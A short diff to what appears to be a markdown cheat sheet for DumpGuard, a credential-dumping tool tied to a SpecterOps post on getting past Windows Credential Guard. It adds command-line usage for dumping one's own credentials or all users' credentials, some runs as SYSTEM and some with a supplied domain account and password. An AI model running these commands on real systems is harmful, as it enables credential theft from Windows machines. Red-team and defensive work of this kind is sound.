@@ -20,7 +20,17 @@ https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/
 ```
 ```
 
-## dump all (NT SYSTEM)
+## dump self using remote credential guard
+```powershell
+DumpGuard.exe /mode:self /domain:<domain_fqdn> /username:<login>$ /password:"<password>"
+```
+
+## dump all using remote credential guard (NT SYSTEM)
+```powershell
+DumpGuard.exe /mode:all /domain:<domain_fqdn> /username:<login>$ /password:"<password>"
+```
+
+## dump all using MSV1 auth package (NT SYSTEM)
 ```powershell
 DumpGuard.exe /mode:all
 ```
